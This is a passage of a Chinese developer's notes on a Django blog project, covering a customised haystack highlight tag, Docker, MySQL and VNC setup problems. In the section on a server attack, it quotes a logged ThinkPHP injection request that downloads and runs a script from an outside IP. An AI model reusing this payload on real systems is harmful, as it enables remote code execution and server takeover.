		        # Highlight summary but only show 40 characters. 
		        {% highlight result.summary with request.query max_length 40 %} 
		    """  
		    bits = token.split_contents()  
		    tag_name = bits[0]  
		  
		    if not len(bits) % 2 == 0:  
		        raise template.TemplateSyntaxError(u"'%s' tag requires valid pairings arguments." % tag_name)  
		  
		    text_block = bits[1]  
		  
		    if len(bits) < 4:  
		        raise template.TemplateSyntaxError(u"'%s' tag requires an object and a query provided by 'with'." % tag_name)  
		  
		    if bits[2] != 'with':  
		        raise template.TemplateSyntaxError(u"'%s' tag's second argument should be 'with'." % tag_name)  
		  
		    query = bits[3]  
		  
		    arg_bits = iter(bits[4:])  
		    kwargs = {}  
		  
		    for bit in arg_bits:  
		        if bit == 'css_class':  
		            kwargs['css_class'] = six.next(arg_bits)  
		  
		        if bit == 'html_tag':  
		            kwargs['html_tag'] = six.next(arg_bits)  
		  
		        if bit == 'max_length':  
		            kwargs['max_length'] = six.next(arg_bits)  
		  
		        if bit == 'start_head':  
		            kwargs['start_head'] = six.next(arg_bits)  
		  
		    return HighlightNode(text_block, query, **kwargs)  
		    

> ```highlighting.py```是拷贝自haystack的util目录.添加了```if self.start_head:  
	            highlighted_chunk = self.text_block[:start_offset] + highlighted_chunk ```,这样子就使高亮部分前后都显示完全，而不是haystack默认的“...”。

	# encoding: utf-8  
  
	from __future__ import absolute_import, division, print_function, unicode_literals  
	  
	from django.utils.html import strip_tags  
	  
	  
	class Highlighter(object):  
	    #默认值  
	    css_class = 'highlighted'  
	    html_tag = 'span'  
	    max_length = 200  
	    start_head = False  
	    text_block = ''  
	  
	    def __init__(self, query, **kwargs):  
	        self.query = query  
	  
	        if 'max_length' in kwargs:  
	            self.max_length = int(kwargs['max_length'])  
	  
	        if 'html_tag' in kwargs:  
	            self.html_tag = kwargs['html_tag']  
	  
	        if 'css_class' in kwargs:  
	            self.css_class = kwargs['css_class']  
	  
	        if 'start_head' in kwargs:  
	            self.start_head = kwargs['start_head']  
	  
	        self.query_words = set([word.lower() for word in self.query.split() if not word.startswith('-')])  
	  
	    def highlight(self, text_block):  
	        self.text_block = strip_tags(text_block)  
	        highlight_locations = self.find_highlightable_words()  
	        start_offset, end_offset = self.find_window(highlight_locations)  
	        return self.render_html(highlight_locations, start_offset, end_offset)  
	  
	    def find_highlightable_words(self):  
	        # Use a set so we only do this once per unique word.  
	        word_positions = {}  
	  
	        # Pre-compute the length.  
	        end_offset = len(self.text_block)  
	        lower_text_block = self.text_block.lower()  
	  
	        for word in self.query_words:  
	            if not word in word_positions:  
	                word_positions[word] = []  
	  
	            start_offset = 0  
	  
	            while start_offset < end_offset:  
	                next_offset = lower_text_block.find(word, start_offset, end_offset)  
	  
	                # If we get a -1 out of find, it wasn't found. Bomb out and  
	                # start the next word.  
	                if next_offset == -1:  
	                    break  
	  
	                word_positions[word].append(next_offset)  
	                start_offset = next_offset + len(word)  
	  
	        return word_positions  
	  
	    def find_window(self, highlight_locations):  
	        best_start = 0  
	        best_end = self.max_length  
	  
	        # First, make sure we have words.  
	        if not len(highlight_locations):  
	            return (best_start, best_end)  
	  
	        words_found = []  
	  
	        # Next, make sure we found any words at all.  
	        for word, offset_list in highlight_locations.items():  
	            if len(offset_list):  
	                # Add all of the locations to the list.  
	                words_found.extend(offset_list)  
	  
	        if not len(words_found):  
	            return (best_start, best_end)  
	  
	        if len(words_found) == 1:  
	            return (words_found[0], words_found[0] + self.max_length)  
	  
	        # Sort the list so it's in ascending order.  
	        words_found = sorted(words_found)  
	  
	        # We now have a denormalized list of all positions were a word was  
	        # found. We'll iterate through and find the densest window we can by  
	        # counting the number of found offsets (-1 to fit in the window).  
	        highest_density = 0  
	  
	        if words_found[:-1][0] > self.max_length:  
	            best_start = words_found[:-1][0]  
	            best_end = best_start + self.max_length  
	  
	        for count, start in enumerate(words_found[:-1]):  
	            current_density = 1  
	  
	            for end in words_found[count + 1:]:  
	                if end - start < self.max_length:  
	                    current_density += 1  
	                else:  
	                    current_density = 0  
	  
	                # Only replace if we have a bigger (not equal density) so we  
	                # give deference to windows earlier in the document.  
	                if current_density > highest_density:  
	                    best_start = start  
	                    best_end = start + self.max_length  
	                    highest_density = current_density  
	  
	        return (best_start, best_end)  
	  
	    def render_html(self, highlight_locations=None, start_offset=None, end_offset=None):  
	        # Start by chopping the block down to the proper window.  
	        #text_block为内容，start_offset,end_offset分别为第一个匹配query开始和按长度截断位置  
	        text = self.text_block[start_offset:end_offset]  
	  
	        # Invert highlight_locations to a location -> term list  
	        term_list = []  
	  
	        for term, locations in highlight_locations.items():  
	            term_list += [(loc - start_offset, term) for loc in locations]  
	  
	        loc_to_term = sorted(term_list)  
	  
	        # Prepare the highlight template  
	        if self.css_class:  
	            hl_start = '<%s class="%s">' % (self.html_tag, self.css_class)  
	        else:  
	            hl_start = '<%s>' % (self.html_tag)  
	  
	        hl_end = '</%s>' % self.html_tag  
	  
	        # Copy the part from the start of the string to the first match,  
	        # and there replace the match with a highlighted version.  
	        #matched_so_far最终求得为text中最后一个匹配query的结尾  
	        highlighted_chunk = ""  
	        matched_so_far = 0  
	        prev = 0  
	        prev_str = ""  
	  
	        for cur, cur_str in loc_to_term:  
	            # This can be in a different case than cur_str  
	            actual_term = text[cur:cur + len(cur_str)]  
	  
	            # Handle incorrect highlight_locations by first checking for the term  
	            if actual_term.lower() == cur_str:  
	                if cur < prev + len(prev_str):  
	                    continue  
	  
	                #分别添上每个query+其后面的一部分（下一个query的前一个位置）  
	                highlighted_chunk += text[prev + len(prev_str):cur] + hl_start + actual_term + hl_end  
	                prev = cur  
	                prev_str = cur_str  
	  
	                # Keep track of how far we've copied so far, for the last step  
	                matched_so_far = cur + len(actual_term)  
	  
	        # Don't forget the chunk after the last term  
	        #加上最后一个匹配的query后面的部分  
	        highlighted_chunk += text[matched_so_far:]  
	  
	        #如果不要开头not start_head才加点  
	        if start_offset > 0 and not self.start_head:  
	            highlighted_chunk = '...%s' % highlighted_chunk  
	  
	        if end_offset < len(self.text_block):  
	            highlighted_chunk = '%s...' % highlighted_chunk  
	  
	        #可见到目前为止还不包含start_offset前面的，即第一个匹配的前面的部分（text_block[:start_offset]），如需展示(当start_head为True时)便加上  
	        if self.start_head:  
	            highlighted_chunk = self.text_block[:start_offset] + highlighted_chunk  
	        return highlighted_chunk

>  在模板文件中使用
	
	{% load extra_tag %}
	
	{% myhighlight blog.object.content with query max_length 100 start_head True %}
	

## 本项目GitHub地址:

1. 项目github地址：请访问[我的GitHub地址](https://github.com/Symbii)




## 遇到的坑

## Docker中遇到某些脚本需要输入yes，y等问题

在docker打包自己项目的时候，由于第一次需要执行```python manage.py rebuild_index``` ，这个时候需要输入y，在Dockerfile中添加

	RUN sh -c '/bin/echo -e "y\n" | python manage.py rebuild_index'
	
### mysqlclient bug
> 由于mac上mysqlclient安装时候遇到如下mysql的bug，所以为了避免后续还遇到乱七八糟的环境问题，把开发环境挪到阿里云。该bug具体可以参考：[mysql官方accept bug](https://bugs.mysql.com/bug.php?id=86971) 和 [stack overflow关于mysqlclient bug](https://stackoverflow.com/questions/43740481/python-setup-py-egg-info-mysqlclient)
	
	Description:
	See this output:

	$ mysql_config
	Usage: /usr/local/bin/mysql_config [OPTIONS]
	Options:
	        --cflags         [-I/usr/local/Cellar/mysql-connector-c/6.1.10/include ]
	        --cxxflags       [-I/usr/local/Cellar/mysql-connector-c/6.1.10/include ]
	        --include        [-I/usr/local/Cellar/mysql-connector-c/6.1.10/include]
	        --libs           [-L/usr/local/Cellar/mysql-connector-c/6.1.10/lib -l ]
	        --libs_r         [-L/usr/local/Cellar/mysql-connector-c/6.1.10/lib -l ]
	        --plugindir      [/usr/local/Cellar/mysql-connector-c/6.1.10/lib/plugin]
	        --socket         [/tmp/mysql.sock]
	        --port           [0]
	        --version        [6.1.10]
	        --variable=VAR   VAR is one of:
	                pkgincludedir [/usr/local/Cellar/mysql-connector-c/6.1.10/include]
	                pkglibdir     [/usr/local/Cellar/mysql-connector-c/6.1.10/lib]
	                plugindir     [/usr/local/Cellar/mysql-connector-c/6.1.10/lib/plugin]
	
	`--libs` and `--libs_r` should have ` -lmysqlclient -lssl -lcrypto`, but it only have `-l`.
	
	How to repeat:
	1. Install MySQL Connector/C 6.1.10
	2. run mysql_config

### vncserver配置问题
> 由于把开发环境挪到阿里云了，在没有修改allow_host情况下，只有本机才能通过浏览器访问，所以必须配置一个vncserver方便我通过服务器桌面访问浏览器进行调试。通过yum groupinstall 好了gnome-desktop, vncserver, 发现通过vncview访问时候能连上，但是无法显示画面,黑屏。最后通过如下方式解决，具体也不知道到底哪些是必须步骤，但是最后一步vim /lib/systemd/system vncserver@.service之后就好了：

	1. yum groupinstall Xfce
	2. vim ~/.vnc/xstartup 修改为如下：
			#!/bin/sh
			export XKL_XMODMAL_DISABLE=1
			unset SESSION_MANAGER
			#unset DBUS_SESSION_BUS_ADDRESS
			#exec /etc/X11/xinit/xinitrc
			#gnome-session &
			
			xfce4-panel &
			xfsettingsd &
			xfwm4 &
			xfdesktop &
			pcmanfm &
			xfce4terminal &

	3.vim /lib/systemd/system/vncserver@.service 添加如下两行：
			VNCSERVERS="1:root"
			VNCSERVERARGS[1]="-geometry 800x600"


### 服务器遭受攻击
>  服务器招受到url注入攻击最后采取封禁了所有陌生的接入ip,以及下面这个下载地址的ip,同时更换了端口

	[23/Dec/2018 22:21:29] "GET /public/index.php?s=/Index/%09hink%07pp/
	invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1]
	[]=curl%20busybox%20wget%20http://142.93.51.155/bash;%20curl%20-O%20http://142.93.51.155/bash;
	%20chmod%20777%20bash;%20./thinkphp;%20rm%20-rf%20bash HTTP/1.1" 404 2346

	iptables -I INPUT -s X.X.X.X -j DROP


### 换成私网ip之后本机无法访问数据库，只有127可以访问，mysql的user表设置问题

>  setting.py中把databse default的host改为服务器小网ip，导致mysql连接不上，最后定位为填小网ip时候，登陆的时候，登陆名为用户名@“host主机名字”，但是由于这个’用户名@host主机名字‘并没有设置mysql密码，但是django的配置中填写了密码，导致登陆不了，最终修改mysql的user表之后，登陆ok

	GRANT ALL PRIVILEGES ON *.* TO '用户名字'@'host主机名字' IDENTIFIED BY '用户密码';

### 数据库导出到不同名字的数据库

>将开发环境和生产环境分离，想着数据库直接用之前的，采用mysqldump命令 复制对应database,然后到开发环境的数据库中source对应的数据。

	mysqldump -uroot -pxxxxx 数据库名 > xxx.sql  

> 这样子不仅复制了表的结构，还复制其中数据， 如果只想要表的结构

	 mysqldump -uroot -pxxxx -d 数据库名 > xxx.sql

> 进入开发环境mysql
	
	source xxx.sql;

>或者执行下面的命令

	mysql 　-uroot -pxxxxx 数据库名 < xxx.sql


这里注意source之后得到的数据库名字和之前是完全一样的，如果你想要不一样的，你需要手动修改xxx.sql中的语句。总之xxx.sql中都是sql语句，如果有问题，可以打开看，看看是不是生成的不对。	
	